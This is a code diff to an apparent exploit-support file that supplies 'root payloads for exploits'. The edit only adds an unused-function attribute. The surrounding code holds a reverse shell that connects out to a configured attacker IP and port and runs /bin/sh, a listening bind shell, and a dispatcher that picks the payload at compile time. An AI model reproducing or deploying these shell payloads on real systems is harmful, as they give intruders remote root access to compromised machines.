@@ -12,9 +12,13 @@
 #define ROOT_PAYLOAD_PORT 6969
 #endif
 
+#ifndef EXP_UNUSED
+#define EXP_UNUSED __attribute__((unused))
+#endif
+
 // Provides various different root payloads for exploits to use
 
-static void reverse_shell(const char *ip, unsigned short port) {
+static EXP_UNUSED void reverse_shell(const char *ip, unsigned short port) {
   int sock;
 	struct sockaddr_in target;
 
@@ -45,7 +49,7 @@ static void reverse_shell(const char *ip, unsigned short port) {
 	execl("/bin/sh", "sh", NULL);
 }
 
-static void listening_shell(unsigned short port) {
+static EXP_UNUSED void listening_shell(unsigned short port) {
   int server_fd, client_fd;
   struct sockaddr_in address;
   socklen_t addrlen = sizeof(address);
@@ -113,12 +117,12 @@ static void listening_shell(unsigned short port) {
   // system(buf);
 }
 
-static void shell() {
+static EXP_UNUSED void shell() {
 	execlp("/bin/sh","/bin/sh",NULL);
 }
 
 // executes the correct root payload based on what exploit is configured for
-static void root_payload() {
+static EXP_UNUSED void root_payload() {
 #ifdef REVERSE_SHELL
   reverse_shell(ROOT_PAYLOAD_IP, ROOT_PAYLOAD_PORT);
 #elif LISTENING_SHELL
